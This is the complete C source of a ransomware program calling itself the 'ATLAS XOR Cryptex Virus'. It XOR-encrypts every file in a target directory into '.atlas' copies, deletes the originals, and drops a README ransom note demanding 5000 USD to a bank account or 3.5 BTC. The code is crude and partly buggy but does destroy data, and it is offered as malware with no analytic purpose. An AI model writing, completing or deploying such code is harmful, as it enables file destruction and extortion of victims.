#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <dirent.h>
#include <sys/types.h>

#define AND &
#define XOR ^
#define NOT !

int i = 0;

FILE *buffer;
FILE *ciphered;
FILE *readme;
float sharedkey[10] = {0.65,100,0.365,0,25.9,999,5,12.58,7.0214,103.126};
float precalculated;

char path[] = {"C:/test"};

struct data_chars {
	char current_char;
	char ciphered_char;
	char pre_ciphered_char;
} data;

struct cipher_attrib {
	int password;
	char file[500];
	char c_file[500];
	char readmsg[500];
} c_attrib;

int main(void)
{
	DIR *dirp;
  struct dirent *direntp;
	c_attrib.password = 900;

	dirp = opendir(path);
 	if (dirp == NULL)
 	{
 		fprintf(stderr, "Error: Unable to open directory\n", perror);
 		exit(EXIT_FAILURE);
 	}
	while ((direntp = readdir(dirp)) != NULL)
 	{
	  fprintf(stdout, "Identifying archive %s\n", direntp -> d_name);
 	  strcpy(c_attrib.file, path);
 	  strcat(c_attrib.file, "/");
 	  strcat(c_attrib.file, direntp -> d_name);
 	  strcpy(c_attrib.c_file, path);
 	  strcat(c_attrib.c_file, "/");

		if((strcmp(direntp -> d_name, ".") == 0)  && (strcmp(direntp -> d_name, "..") == 0))
		{
			fprintf(stderr, "Jumping Archive  %s", c_attrib.file);
		}
		else
		if((strcmp(direntp -> d_name, ".") != 0)  && (strcmp(direntp -> d_name, "..") != 0))
		{

			buffer = fopen(c_attrib.file, "r"); /* Open the file to Encrypt */
 			if(buffer == NULL)
			{
				fputs("Error opening file or does not exist !", stderr);
				exit(EXIT_FAILURE);
			}
			strcat(c_attrib.c_file, direntp -> d_name);
			strcat(c_attrib.c_file, ".atlas");
 			ciphered = fopen(c_attrib.c_file, "w+"); /*Create encrypted file */
			if(ciphered == NULL)
			{
				fputs("Error opening file encryptor", stderr);
				exit(EXIT_FAILURE);
			}
			while(!(feof(buffer)))
			{
				data.current_char = fgetc(buffer);
				data.pre_ciphered_char = (char)((int)data.current_char XOR c_attrib.password);
				for(i = 0;i <= 10;i++)
				precalculated = (sharedkey[i] * c_attrib.password);
				data.ciphered_char = (char)((int)data.pre_ciphered_char XOR (int)precalculated);
				fputc(data.ciphered_char,ciphered);
			}
			fclose(buffer);
			fclose(ciphered);
 	  	strcpy(c_attrib.file, path);
 	  	strcat(c_attrib.file, "/");
 	  	strcat(c_attrib.file, direntp -> d_name);
			remove(c_attrib.file);
		}
	}
	strcat(c_attrib.readmsg, path);
	strcat(c_attrib.readmsg, "/");
	strcat(c_attrib.readmsg, "README.txt");
	readme = fopen(c_attrib.readmsg,"w+");
	fprintf(readme,
					"\t-------------------------------------\n"
					"\t-This is the ATLAS XOR Cryptex Virus-\n"
					"\t-------------------------------------\n\n\n"
					"\t------------------------------------------------------------------------------------------\n"
					"\tIf you want to recover your valuable information\n"
					"\tYou only need to deposit 5000 $ USD\n"
					"\tIn SBI bank in India with the number \n"
					"\tOf account 787562312 with its name of instutucion and data\n"
					"\tTo be able to give you the decryption key or send 3.5BTC\n"
					"\tat the bitcoin address:............\n\n\n"
					"\tRemember your Information is in play, do not accept the payment process and your information\n"
					"\tWill be completely lost\n"
					"\t------------------------------------------------------------------------------------------\n\n\n"
					"\tATLAS\n\n");
	fclose(readme);
	return 0;
}
